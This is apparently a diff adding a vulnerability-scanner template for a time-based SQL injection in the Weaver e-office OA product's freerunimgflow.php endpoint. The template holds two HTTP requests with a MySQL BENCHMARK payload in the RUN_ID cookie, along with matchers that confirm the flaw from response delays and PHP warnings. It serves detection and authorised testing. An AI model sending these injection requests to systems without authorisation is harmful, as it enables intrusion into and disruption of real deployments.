@@ -1,0 +1,33 @@
+id: poc-yaml-weaver-e-office-freerunimgflow-sqli
+
+info:
+  name: 泛微OA e-office freerunimgflow SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 泛微OA,e-office
+
+http:
+  - raw:
+      - |
+        GET /general/workflow/freerunimgflow.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
+      - |
+        GET /general/workflow/freerunimgflow.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RUN_ID=1 AND 9814=BENCHMARK(8000000,MD5(0x55615462))
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Warning"
+          - "Variable passed to each()"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
